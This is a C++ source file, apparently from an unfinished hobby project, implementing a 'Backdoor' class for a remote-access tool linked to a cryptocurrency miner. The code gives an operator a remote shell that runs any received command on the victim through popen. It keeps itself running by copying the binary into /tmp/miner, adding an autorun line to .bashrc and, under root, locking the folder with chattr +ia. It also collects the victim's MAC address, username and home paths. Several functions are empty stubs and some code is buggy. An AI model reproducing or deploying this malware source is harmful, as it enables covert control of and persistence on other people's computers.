#include "backdoor.h"

/*
    Socket codes:
        1 - shell
        2 - download
        3 - upload
        4 - MinerInfo
*/


void Backdoor::shell(){
    if(this->is_server){
        while(true){
            std::string input; 
            std::cout << "~$ ";
            std::getline(std::cin, input);
            if(input == "exit"){
                this->c->send_message(sock, "exit"); // ?????? SOCK VAI SER QUAL DAS CONEXÕES ???
                break;
            }else{
                const char * msg = input.c_str();
                char * output;
                this->c->send_message(sock, msg); // QUAL SOCK ??????
                output = this->c->recv_message(sock); // QUAL SOCK ?????????
                std::cout << output << std::endl;
            }   
        }
    }else{

        while(true){

            char *command = this->c->recv_message(this->sock);    
            char *copy, *part;
            strcpy(copy, command);
            part = strtok(copy, " ");
            
            if(strcmp(part, "cd") == 0){
                part = strtok(NULL, " "); // get the path to cd to
                DIR * directory = opendir(part);

                if(directory != NULL){
                    closedir(directory);
                    chdir(part);
                    this->c->send_message(this->sock, this->execute_command("pwd"));

                }else{
                    this->c->send_message(this->sock, "directory doesn't exists.");
                }

            }else if(strcmp(part, "exit") == 0){
                break;
            }else{
                char * output = execute_command(command);
                this->c->send_message(this->sock, output);
            }            
        }
    }
}


void Backdoor::upload(const char * path){
    if(this->is_server){

    }else{

    }
}


void Backdoor::download(const char *path){
    if(this->is_server){

    }else{

    }
}


void Backdoor::menu(){
    if(this->is_server){
        while(true){
            int choice;
            execute_command("cls");
            std::cout << "MINER_ID = " << this->miner_id << " - IP = \n" << this->client_ip << std::endl;

            std::cout << "Operações : " << std::endl;

            std::cout << "1) Shell\n2) Download\n3)Upload\n" << std::endl;

            choice = std::cin.get();


            if(choice == 1){
                this->c->send_message(this->sock, "1");
                this->shell();
            
            }else if(choice == 2){
                std::string path;
                std::cout << "Path: ";
                std::getline(std::cin, path);
                // Get path
                this->c->send_message(this->sock, "2");
                this->download(path.c_str());

            }else if(choice == 3){
                std::string path;
                std::cout << "Path: ";
                std::getline(std::cin, path);
                this->c->send_message(this->sock, "3");
                this->upload(path.c_str());
            }else if(choice == 4){
                return;
            
            }else{
                Error::log_error("Comando inválido");
            }
        }
    }else{
        
    }
}



void Backdoor::persistence(){
    
    if(strcmp(PLATFORM_NAME, "linux") == 0){
        // variables
        const char *  root_path_init_d = "/etc/init.d";
        const char * persistence_directory = "/tmp/miner";
        const char * chattr = "sudo chattr +ia /tmp/miner/";
        std::string bash_rc_file = std::string(this->user_home) += std::string(".bashrc");
        std::string move_to_dir = std::string("cp ") += std::string(this->program_name) += std::string(" ")
                                += std::string(persistence_directory);
        const char * copy = move_to_dir.c_str();
        
        std::string bash_rc_command_execution = std::string("cd /tmp/miner/; ./") += std::string(this->program_name);
        std::string bash_rc_insertion = std::string("echo \"") += bash_rc_command_execution += std::string("\"") 
                                        += std::string(" >> ") += bash_rc_file;
        const char * persistence_on_bash_rc = bash_rc_insertion.c_str();


        // create directory to store stuff
        mkdir(persistence_directory, S_IRWXU | S_IRWXG | S_IROTH | S_IXOTH);
        this->execute_command(copy);
        this->execute_command(persistence_on_bash_rc);

        if(geteuid() != 0){
            std::cout << "Not root";

        }else{
            // only root can delete.
            this->execute_command(chattr);
            std::cout << "root";
        }
    }else{
        std::cout << "Windows still not supported" << std::endl;
    }
}


std::string Backdoor::get_miner_id(){
    if(this->is_server){
        std::string miner_info;
        this->c->send_message(this->sock, "4");
        return this->c->recv_message(this->sock);
    
    }else{
        
        char wlan0[20], eth0[20];
        FILE * f, *g; 
        f = fopen("/sys/class/net/wlan0/address", "r");
        if(f != NULL){
            fscanf(f, "%s", wlan0);
            fclose(f);
            c->send_message(this->sock, wlan0);
            return NULL;

        }else{
            g = fopen("/sys/class/net/eth0/address", "r");
            if(g != NULL){
                fscanf(g, "%s", eth0);
                fclose(g);
                c->send_message(this->sock, eth0);
                return NULL;
            }
        }
    }
}


std::string Backdoor::get_miner_ip(){
    return  std::string(this->client_ip);
}


void Backdoor::get_home_enviroment(){
    struct passwd *pw;
    char * home;
    uid_t uid;
    uid_t NO_UID = -1;
    uid = getuid();

    pw = (uid == NO_UID && 0? NULL: getpwuid(uid));
    home = (char*)malloc((sizeof(char) * strlen(pw->pw_dir)));
    strcpy(home, pw->pw_dir);
    strcat(home, "/");
    this->user_home = home;
}


void Backdoor::get_username(){
    struct passwd *pw;
    uid_t uid;
    uid_t NO_UID = -1;
    uid = getuid();

    pw = (uid == NO_UID && 0? NULL: getpwuid(uid));
    this->user_name = pw->pw_name;
}


void Backdoor::get_desktop_enviroment(){
    char * path = (char *)malloc((sizeof(char)*strlen(this->user_home) + 9));
    strcpy(path, this->user_home);
    strcat(path, "Desktop/");
    this->user_desktop = path;   
}


char * Backdoor::execute_command(const char *command){
    FILE *fpipe;
    char line[256];
    char *output;
    
    output = (char *)malloc(sizeof(char) * MAX_TERMINAL_OUTPUT);
    memset(output, 0, MAX_TERMINAL_OUTPUT);

    if (!(fpipe = (FILE*)popen(command,"r"))){
        return NULL;
    }

    while ( fgets( line, 256, fpipe)){
        strcat(output, line);
    }
    pclose(fpipe);
    return output;
}

Backdoor::Backdoor(int sock, Communication *c, bool is_server, char *ip){
    this->sock = sock;
    this->c  = c;
    this->is_server = is_server;
    this->client_ip = ip;

    program_name = (char*)malloc(10);
    strcpy(this->program_name, "backdoor");

    if(is_server){
        //menu();
        
    }else{
        // GET ENVIROMENT VARIABLES
        get_home_enviroment();
        get_username();
        get_desktop_enviroment();
    }
}